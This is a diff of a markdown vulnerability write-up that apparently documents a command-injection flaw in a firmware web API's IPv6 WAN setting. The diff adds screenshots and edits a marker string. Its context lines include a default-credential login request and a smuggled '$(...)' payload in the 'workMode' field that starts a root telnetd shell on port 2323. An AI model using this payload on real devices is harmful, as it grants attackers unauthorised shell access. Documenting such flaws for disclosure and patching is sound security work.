@@ -69,7 +69,7 @@ can still pass the `dynamic` check. If the command substitution produces no stdo
 ```sh
 [ dynamic != "dynamic" ]
 ```
-
+![alt text](imag/image.png)
 so the code keeps the expected control-flow decision while the command-substitution side effect has already executed. The same attacker-controlled value is then copied again through `eval`.
 
 ## Firmware Paths for Audit
@@ -139,7 +139,7 @@ Connection: close
 
 {"username":"admin","password":"admin123"}
 ```
-
+![alt text](imag/image-1.png)
 2. Extract `data.session` and send:
 
 ```http
@@ -151,9 +151,9 @@ Content-Type: application/json
 AUTHENTICATION: <SESSION>
 Connection: close
 
-[{"id":1,"object":"esps.ipv6.wan","method":"set","param":{"list":[{"intf":"WAN1","workMode":"dynamic $(echo IPV6WAN_RCE_OK >/tmp/ipv6wan_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"}]}}]
+[{"id":1,"object":"esps.ipv6.wan","method":"set","param":{"list":[{"intf":"WAN1","workMode":"dynamic $(echo IPV6WAN_RCE_OK_2323 >/tmp/ipv6wan_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"}]}}]
 ```
-
+![alt text](imag/image-2.png)
 3. Wait briefly and connect:
 
 ```bash
@@ -173,7 +173,7 @@ id
 uname -a
 cat /tmp/ipv6wan_rce_marker
 ```
-
+![alt text](imag/image-3.png)
 5. Optional readback requests:
 
 ```http
